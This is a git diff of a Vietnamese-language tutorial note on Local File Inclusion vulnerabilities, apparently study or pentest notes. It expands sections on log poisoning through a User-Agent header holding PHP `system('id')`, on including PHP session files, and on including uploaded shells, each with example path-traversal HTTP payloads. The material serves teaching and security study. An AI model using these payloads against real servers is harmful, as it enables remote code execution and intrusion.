@@ -1,7 +1,7 @@
-# LFI (Local File Inclusion)
+# LFI vul (Local File Inclusion)
 
 ## 1. Định Nghĩa
-- **Local File Inclusion (LFI)** là một lỗ hổng bảo mật web xảy ra khi ứng dụng không kiểm tra hoặc lọc dữ liệu đầu vào một cách chặt chẽ. LFI cho phép kẻ tấn công chỉ định đường dẫn tới các file trên máy chủ, dẫn đến việc tải hoặc thực thi các file đó.
+Local File Inclusion (LFI) là một lỗ hổng bảo mật web xảy ra khi ứng dụng không kiểm tra hoặc lọc dữ liệu đầu vào một cách chặt chẽ. LFI cho phép kẻ tấn công chỉ định đường dẫn tới các file trên máy chủ, dẫn đến việc tải hoặc thực thi các file đó.
 
 ---
 
@@ -68,21 +68,38 @@ Payload:
 ```
 
 ### 4.4. Chèn Mã Vào Log Files
-- Sử dụng `User-Agent` để chèn mã độc vào log server:
-```http
-User-Agent: <?php system('id'); ?>
-```
-- Sau đó, truy cập log file qua LFI:
-```http
-http://example.com/index.php?page=../../var/log/apache2/access.log
-```
+- **Chi Tiết**:
+  1. Kẻ tấn công gửi một yêu cầu HTTP chứa mã độc trong header (ví dụ: `User-Agent`).
+  2. Mã độc được ghi vào log file của server (thường ở `/var/log/apache2/access.log`).
+  3. LFI được sử dụng để đọc và thực thi log file đó.
+- **Ví Dụ Payload**:
+  ```http
+  GET /index.php?page=../../var/log/apache2/access.log HTTP/1.1
+  User-Agent: <?php system('id'); ?>
+  ```
+- **Giải Thích**: Nếu server log không được bảo vệ, mã độc có thể được thực thi ngay khi `include()` được gọi đến log file.
 
 ### 4.5. Khai Thác Session Files
-- File session của PHP thường lưu tại `/var/lib/php/sessions/`.
-- Sử dụng LFI để đọc hoặc chỉnh sửa session file:
-```http
-http://example.com/index.php?page=/var/lib/php/sessions/sess_<session_id>
-```
+- **Chi Tiết**:
+  1. PHP lưu session của người dùng dưới dạng file tại thư mục `/var/lib/php/sessions/` (hoặc tương đương).
+  2. Kẻ tấn công tạo session chứa mã độc thông qua ứng dụng web.
+  3. Sử dụng LFI để đọc và thực thi file session này.
+- **Ví Dụ Payload**:
+  ```http
+  GET /index.php?page=/var/lib/php/sessions/sess_<session_id>
+  ```
+- **Giải Thích**: Nếu nội dung của file session chứa mã PHP, nó sẽ được thực thi khi `include()` gọi đến.
+
+### 4.6. Khai Thác File Upload
+- **Chi Tiết**:
+  1. Ứng dụng cho phép upload file mà không kiểm tra định dạng hoặc nội dung.
+  2. Kẻ tấn công upload một file PHP chứa mã độc (ví dụ: shell).
+  3. Sử dụng LFI để bao gồm và thực thi file đã upload.
+- **Ví Dụ Payload**:
+  ```http
+  GET /index.php?page=uploads/shell.php
+  ```
+- **Giải Thích**: LFI hoạt động như một cách để thực thi file độc hại đã được tải lên.
 
 ---
 
